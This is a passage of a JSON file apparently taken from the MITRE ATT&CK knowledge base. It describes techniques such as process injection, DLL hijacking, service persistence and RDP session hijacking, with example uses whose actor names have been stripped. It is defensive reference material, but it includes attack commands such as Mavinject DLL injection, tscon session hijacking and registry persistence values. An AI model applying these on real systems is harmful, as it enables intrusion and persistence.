      "installed its payload in the startup programs folder as \"Baidu Software Update.\" The group also adds its second stage payload to the startup programs as “Net Monitor.\"",
      "tools attempt to spoof anti-virus processes as a means of self-defense.",
      "actors used the following command to rename one of their tools to a benign file name: ren \"%temp%\\upload\" audiodg.exe",
      "malware names itself \"svchost.exe,\" which is the name of the Windows shared service host program.",
      "The file name AcroRD32.exe, a legitimate process name for Adobe's Acrobat Reader, was used by  as a name for malware."
    ],
    "id": "T1036",
    "name": "Masquerading",
    "similar_words": [
      "Masquerading"
    ]
  },
  "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d": {
    "description": "Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.\n\n### Windows\n\nThere are multiple approaches to injecting code into a live process. Windows implementations include: (Citation: Endgame Process Injection July 2017)\n\n* **Dynamic-link library (DLL) injection** involves writing the path to a malicious DLL inside a process then invoking execution by creating a remote thread.\n* **Portable executable injection** involves writing malicious code directly into the process (without a file on disk) then invoking execution with either additional code or by creating a remote thread. The displacement of the injected code introduces the additional requirement for functionality to remap memory references. Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue. (Citation: Endgame HuntingNMemory June 2017)\n* **Thread execution hijacking** involves injecting malicious code or the path to a DLL into a thread of a process. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), the thread must first be suspended.\n* **Asynchronous Procedure Call** (APC) injection involves attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)  AtomBombing  (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. (Citation: Microsoft Atom Table)\n* **Thread Local Storage** (TLS) callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. (Citation: FireEye TLS Nov 2017)\n\n### Mac and Linux\n\nImplementations for Linux and OS X/macOS systems include: (Citation: Datawire Code Injection) (Citation: Uninformed Needle)\n\n* **LD_PRELOAD, LD_LIBRARY_PATH** (Linux), **DYLD_INSERT_LIBRARIES** (Mac OS X) environment variables, or the dlfcn application programming interface (API) can be used to dynamically load a library (shared object) in a process which can be used to intercept API calls from the running process. (Citation: Phrack halfdead 1997)\n* **Ptrace system calls** can be used to attach to a running process and modify it in runtime. (Citation: Uninformed Needle)\n* **/proc/[pid]/mem** provides access to the memory of the process and can be used to read/write arbitrary data to it. This technique is very rare due to its complexity. (Citation: Uninformed Needle)\n* **VDSO hijacking** performs runtime injection on ELF binaries by manipulating code stubs mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)\n\nMalware commonly utilizes process injection to access system resources through which Persistence and other environment modifications can be made. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
    "example_uses": [
      "has injected code into trusted processes.",
      "copies itself into a running Internet Explorer process to evade detection.",
      "A  tool can spawn svchost.exe and inject the payload into that process.",
      "injects into other processes to load modules.",
      "malware can download a remote access tool, NanoCore, and inject into another process.",
      "injects itself into various processes depending on whether it is low integrity or high integrity.",
      "If running in a Windows environment,  saves a DLL to disk that is injected into the explorer.exe process to execute the payload.  can also be configured to inject and execute within specific processes.",
      "can perform process injection by using a reflective DLL.",
      "injects its malware variant, , into the cmd.exe process.",
      "injects into the Internet Explorer process.",
      "injects into the svchost.exe process.",
      "creates a suspended svchost process and injects its DLL into it.",
      "is capable of injecting code into the APC queue of a created  process as part of an \"Early Bird injection.\"",
      "performs a reflective DLL injection using a given pid.",
      "uses a batch file to load a DLL into the svchost.exe process.",
      "has used Metasploit to perform reflective DLL injection in order to escalate privileges.",
      "downloads an executable and injects it directly into a new process.",
      "A  malware sample performs reflective DLL injection.",
      "has used various methods of process injection including hot patching.",
      "contains a collection of CodeExecution modules that enable by injecting code (DLL, shellcode) or reflectively loading a Windows PE file into a process.",
      "creates a backdoor through which remote attackers can inject files into running processes.",
      "can inject content into lsass.exe to load a module.",
      "can migrate into another process using reflective DLL injection.",
      "performs multiple process injections to hijack system processes and execute malicious code.",
      "injects itself into the secure shell (SSH) process.",
      "performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.  performs a separate injection of its communication module into an Internet accessible process through which it performs C2.",
      "uses reflective DLL injection to inject the malicious library and execute the RAT.",
      "can inject a variety of payloads into processes dynamically chosen by the adversary.",
      "injects its DLL file into a newly spawned Internet Explorer process.",
      "will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).",
      "injects a DLL for  into the explorer.exe process.",
      "injects its DLL component into svchost.exe.",
      "performs code injection injecting its own functions to browser processes.",
      "injects itself into explorer.exe.",
      "injects DLL files into iexplore.exe.",
      "can perform DLL loading.",
      "After decrypting itself in memory,  downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This “downloaded” file is actually not dropped onto the system.",
      "can inject a malicious DLL into a process.",
      "can perform DLL injection.",
      "injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.",
      "An executable dropped onto victims by  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe)."
    ],
    "id": "T1055",
    "name": "Process Injection",
    "similar_words": [
      "Process Injection"
    ]
  },
  "attack-pattern--44dca04b-808d-46ca-b25f-d85236d4b9f8": {
    "description": "Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",
    "example_uses": [],
    "id": "T1139",
    "name": "Bash History",
    "similar_words": [
      "Bash History"
    ]
  },
  "attack-pattern--451a9977-d255-43c9-b431-66de80130c8c": {
    "description": "Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access. To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software. \n\nThis technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
    "example_uses": [
      "provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.",
      "provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet"
    ],
    "id": "T1205",
    "name": "Port Knocking",
    "similar_words": [
      "Port Knocking"
    ]
  },
  "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4": {
    "description": "Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application whitelisting and signature validation on systems. This technique accounts for proxy execution methods that are not already accounted for within the existing techniques.\n\n### Mavinject.exe\nMavinject.exe is a Windows utility that allows for code execution. Mavinject can be used to input a DLL into a running process. (Citation: Twitter gN3mes1s Status Update MavInject32)\n\n\"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe\" <PID> /INJECTRUNNING <PATH DLL>\nC:\\Windows\\system32\\mavinject.exe <PID> /INJECTRUNNING <PATH DLL>\n\n### SyncAppvPublishingServer.exe\nSyncAppvPublishingServer.exe can be used to run powershell scripts without executing powershell.exe. (Citation: Twitter monoxgas Status Update SyncAppvPublishingServer)\n\nSeveral others binaries exist that may be used to perform similar behavior. (Citation: GitHub Ultimate AppLocker Bypass List)",
    "example_uses": [],
    "id": "T1218",
    "name": "Signed Binary Proxy Execution",
    "similar_words": [
      "Signed Binary Proxy Execution"
    ]
  },
  "attack-pattern--45d84c8b-c1e2-474d-a14d-69b5de0a2bc0": {
    "description": "The source command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways source /path/to/filename [arguments] or . /path/to/filename [arguments]. Take note of the space after the \".\". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment. \n\nAdversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.",
    "example_uses": [],
    "id": "T1153",
    "name": "Source",
    "similar_words": [
      "Source"
    ]
  },
  "attack-pattern--46944654-fcc1-4f63-9dad-628102376586": {
    "description": "Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
    "example_uses": [
      "has performed DLL search order hijacking to execute their payload.",
      "can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.",
      "is likely loaded via DLL hijacking into a legitimate McAfee binary.",
      "A  variant uses DLL search order hijacking.",
      "contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.",
      "is launched through use of DLL search order hijacking to load a malicious dll.",
      "has used DLL search order hijacking.",
      "Variants of  achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\\WINDOWS\\ntshrui.dll).",
      "uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.",
      "abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.",
      "uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory."
    ],
    "id": "T1038",
    "name": "DLL Search Order Hijacking",
    "similar_words": [
      "DLL Search Order Hijacking"
    ]
  },
  "attack-pattern--478aa214-2ca7-4ec0-9978-18798e514790": {
    "description": "When operating systems boot up, they can start programs or applications called services that perform background system functions. (Citation: TechNet Services) A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. \n\nAdversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with [Masquerading](https://attack.mitre.org/techniques/T1036). Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1035).",
    "example_uses": [
      "backdoor RoyalDNS established persistence through adding a service called Nwsapagent.",
      "creates a Registry subkey that registers a new service.",
      "has created new services to establish persistence.",
      "creates a Windows service to establish persistence.",
      "created new Windows services and added them to the startup directories for persistence.",
      "A  tool can create a new service, naming it after the config information, to gain persistence.",
      "can install itself as a new service.",
      "Some  variants create a new Windows service to establish persistence.",
      "adds a new service named NetAdapter to establish persistence.",
      "creates a new Windows service with the malicious executable for persistence.",
      "variants can add malicious DLL modules as new services.",
      "Some  variants install .dll files as services with names generated by a list of hard-coded strings.",
      "registers itself as a service by adding several Registry keys.",
      "creates a new service named WmiApSrvEx to establish persistence.",
      "installs a service pointing to a malicious DLL dropped to disk.",
      "creates a new service to establish.",
      "creates a backdoor through which remote attackers can create a service.",
      "creates new services to establish persistence.",
      "can add a new service to ensure  persists on the system when delivered as another payload onto the system.",
      "creates a Registry subkey that registers a new service.",
      "can install a new service.",
      "installs itself as a new service.",
      "installs itself as a service to maintain persistence.",
      "has a tool that creates a new service for persistence.",
      "If running as administrator,  installs itself as a new service named bmwappushservice to establish persistence.",
      "uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.",
      "sets its DLL file as a new service in the Registry to establish persistence.",
      "can install as a Windows service for persistence.",
      "can be added as a service to establish persistence.",
      "uses Windows services typically named \"javamtsup\" for persistence.",
      "One variant of  creates a new service using either a hard-coded or randomly generated name.",
      "Some  samples install themselves as services for persistence by calling WinExec with the net start argument.",
      "creates Registry keys to allow itself to run as various services.",
      "One persistence mechanism used by  is to register itself as a Windows service.",
      "creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.",
      "installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.",
      "can create a new service named msamger (Microsoft Security Accounts Manager).",
      "establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.",
      "creates a new service named “ntssrv” to execute the payload.",
      "is capable of configuring itself as a service.",
      "configures itself as a service.",
      "has registered itself as a service to establish persistence.",
      "installs itself as a service for persistence.",
      "Several  malware families install themselves as new services on victims.",
      "malware installs itself as a service to provide persistence and SYSTEM privileges."
    ],
    "id": "T1050",
    "name": "New Service",
    "similar_words": [
      "New Service"
    ]
  },
  "attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830": {
    "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.\n\nIn Mac, this can be done natively with a small [AppleScript](https://attack.mitre.org/techniques/T1155) script.",
    "example_uses": [
      "obtains application windows titles and then determines which windows to perform  on.",
      "gathers information about opened windows.",
      "captures window titles.",
      "can enumerate active windows.",
      "The discovery modules used with  can collect information on open windows.",
      "reports window names along with keylogger information to provide application context.",
      "is capable of enumerating application windows.",
      "has a command to get text of the current foreground window.",
      "malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground."
    ],
    "id": "T1010",
    "name": "Application Window Discovery",
    "similar_words": [
      "Application Window Discovery"
    ]
  },
  "attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5": {
    "description": "Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",
    "example_uses": [
      "uses AES to encrypt network communication.",
      "encrypts command and control communications with RC4.",
      "Some  samples encrypt C2 communications with RC4.",
      "has used the Plink utility to create SSH tunnels.",
      "used the Plink utility and other tools to create tunnels to C2 servers.",
      "can use SSL and TLS for communications.",
      "uses AES to encrypt certain information sent over its C2 channel.",
      "Some versions of  have used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.",
      "has used the Plink utility to tunnel RDP back to C2 infrastructure.",
      "has encrypted C2 traffic with RSA.",
      "provides a reverse shell connection on 8338/TCP, encrypted via AES.",
      "encrypts C2 data with AES256 in ECB mode.",
      "has used RC4 to encrypt C2 traffic.",
      "default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.",
      "contains a copy of the OpenSSL library to encrypt C2 traffic.",
      "Some  variants use SSL to encrypt C2 communications.",
      "Some  samples use AES to encrypt C2 traffic.",
      "has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic.",
      "encrypts data sent to its C2 server over HTTP with RC4.",
      "uses RC4 encryption to obfuscate HTTP traffic.",
      "encrypts C2 traffic using RC4 with a static key.",
      "network loader encrypts C2 traffic with RSA and RC6.",
      "uses the Camellia cipher to encrypt communications.",
      "has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear.",
      "The  command and control protocol's data stream can be encrypted with AES-CBC.",
      "A variant of  encrypts some C2 with 3DES and RSA.",
      "uses RC4 to encrypt C2 responses.",
      "Some variants of  use RC4 to encrypt C2 traffic.",
      "can encrypt C2 traffic with AES.",
      "encrypts C2 traffic using an RC4 key.",
      "encrypts some C2 traffic with the Blowfish cipher.",
      "C2 traffic has been encrypted with RC4 and AES.",
      "encrypts the message body of HTTP traffic with RC2 (in CBC mode) and Base64 encoding.",
      "uses RC4 to encrypt C2 traffic.",
      "has used the  RAT, which communicates over HTTP with a payload encrypted with RC4.",
      "will decrypt resources it downloads with HTTP requests by using RC4 with the key \"ScoutEagle.\"",
      "encrypts exfiltrated data with RC4.",
      "uses SSL/TLS and RC4 to encrypt traffic.",
      "uses AES to encrypt C2 traffic.",
      "encrypts C2 traffic using AES with a static key.",
      "command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS.",
      "uses AES to encrypt C2 communications.",
      "encrypts C2 traffic with AES and RSA.",
      "encrypts C2 communications with RC4 as well as TLS.",
      "malware encrypts C2 traffic using RC4 with a hard-coded key.",
      "used the Plink command-line utility to create SSH tunnels to C2 servers.",
      "malware uses Caracachs encryption to encrypt C2 payloads.",
      "uses RC4 to encrypt the message body of HTTP content."
    ],
    "id": "T1032",
    "name": "Standard Cryptographic Protocol",
    "similar_words": [
      "Standard Cryptographic Protocol"
    ]
  },
  "attack-pattern--4be89c7c-ace6-4876-9377-c8d54cef3d63": {
    "description": "A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.",
    "example_uses": [],
    "id": "T1062",
    "name": "Hypervisor",
    "similar_words": [
      "Hypervisor"
    ]
  },
  "attack-pattern--4bf5845d-a814-4490-bc5c-ccdee6043025": {
    "description": "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager are loaded into every process that calls the ubiquitously used application programming interface (API) functions: (Citation: Endgame Process Injection July 2017)\n\n* CreateProcess\n* CreateProcessAsUser\n* CreateProcessWithLoginW\n* CreateProcessWithTokenW\n* WinExec\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.",
    "example_uses": [
      "service-based DLL implant can execute a downloaded file with parameters specified using CreateProcessAsUser.",
      "can establish using a AppCertDLLs Registry key."
    ],
    "id": "T1182",
    "name": "AppCert DLLs",
    "similar_words": [
      "AppCert DLLs"
    ]
  },
  "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466": {
    "description": "Data exfiltration may be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.",
    "example_uses": [
      "can sleep for a specific time and be set to communicate at specific intervals.",
      "can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.",
      "creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.",
      "can sleep for a given number of seconds.",
      "collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.",
      "can set its \"beacon\" payload to reach out to the C2 server on an arbitrary and random interval. In addition it will break large data sets into smaller chunks for exfiltration."
    ],
    "id": "T1029",
    "name": "Scheduled Transfer",
    "similar_words": [
      "Scheduled Transfer"
    ]
  },
  "attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79": {
    "description": "Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.",
    "example_uses": [
      "established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion]Winlogon.",
      "A  variant registers as a Winlogon Event Notify DLL to establish persistence.",
      "can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon."
    ],
    "id": "T1004",
    "name": "Winlogon Helper DLL",
    "similar_words": [
      "Winlogon Helper DLL"
    ]
  },
  "attack-pattern--519630c5-f03f-4882-825c-3af924935817": {
    "description": "Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists.",
    "example_uses": [
      "apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.",
      "includes garbage code to mislead anti-malware software and researchers.",
      "Before writing to disk,  inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.",
      "contains junk code in its functions in an effort to confuse disassembly programs.",
      "appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.",
      "contains junk code in its binary, likely to confuse malware analysts.",
      "has inserted garbage characters into code, presumably to avoid anti-virus detection.",
      "has obfuscated DLLs and functions using dummy API calls inserted between real instructions.",
      "downloader code has included \"0\" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.",
      "contains unused machine instructions in a likely attempt to hinder analysis.",
      "A version of  introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.",
      "A variant of  appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.",
      "has been known to employ binary padding."
    ],
    "id": "T1009",
    "name": "Binary Padding",
    "similar_words": [
      "Binary Padding"
    ]
  },
  "attack-pattern--51dea151-0898-4a45-967c-3ebee0420484": {
    "description": "Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware)\n\nAdversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, c:\\windows\\system32\\tscon.exe [session number to be stolen], an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)",
    "example_uses": [
      "has used Remote Desktop Protocol to conduct lateral movement.",
      "moved laterally via RDP.",
      "enables concurrent Remote Desktop Protocol (RDP).",
      "can enable remote desktop on the victim's machine.",
      "has a module for performing remote desktop access.",
      "has used RDP for.",
      "can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.",
      "enables the Remote Desktop Protocol for persistence.",
      "has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.",
      "has used RDP to move laterally to systems in the victim environment.",
      "has used RDP connections to move across the victim network.",
      "can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.",
      "attempted to use RDP to move laterally.",
      "used RDP to move laterally in victim networks.",
      "malware SierraCharlie uses RDP for propagation.",
      "The  group is known to have used RDP during operations.",
      "The  group is known to have used RDP during operations."
    ],
    "id": "T1076",
    "name": "Remote Desktop Protocol",
    "similar_words": [
      "Remote Desktop Protocol"
    ]
  },
  "attack-pattern--51ea26b1-ff1e-4faa-b1a0-1114cd298c87": {
    "description": "Exfiltration could occur over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel. Adversaries could choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "example_uses": [
      "has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity."
    ],
    "id": "T1011",
    "name": "Exfiltration Over Other Network Medium",
    "similar_words": [
      "Exfiltration Over Other Network Medium"
    ]
  },
  "attack-pattern--52d40641-c480-4ad5-81a3-c80ccaddf82d": {
    "description": "Windows Authentication Package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system. (Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA Authentication Packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ with the key value of \"Authentication Packages\"=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.",
    "example_uses": [
      "can use Windows Authentication Packages for persistence."
    ],
    "id": "T1131",
    "name": "Authentication Package",
    "similar_words": [
      "Authentication Package"
    ]
  },
  "attack-pattern--52f3d5a6-8a0f-4f82-977e-750abf90d0b0": {
    "description": "Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data). (Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of extra window memory (EWM) to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may take place in the address space of a separate live process. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread. (Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)",
    "example_uses": [
      "overwrites Explorer’s Shell_TrayWnd extra window memory to redirect execution to a NTDLL function that is abused to assemble and execute a return-oriented programming (ROP) chain and create a malicious thread within Explorer.exe."
    ],
    "id": "T1181",
    "name": "Extra Window Memory Injection",
    "similar_words": [
      "Extra Window Memory Injection"
    ]
  },
  "attack-pattern--53bfc8bf-8f76-4cd7-8958-49a884ddb3ee": {
    "description": "Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made  (Citation: Sofacy Komplex Trojan). Running a command from launchctl is as simple as launchctl submit -l <labelName> -- /Path/to/thing/to/execute \"arg\" \"arg\" \"arg\". Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. \n\nAdversaries can abuse this functionality to execute code or even bypass whitelisting if launchctl is an allowed process.",
    "example_uses": [
      "uses launchctl to enable screen sharing on the victim’s machine."
    ],
    "id": "T1152",
    "name": "Launchctl",
    "similar_words": [
      "Launchctl"
    ]
  },
  "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47": {
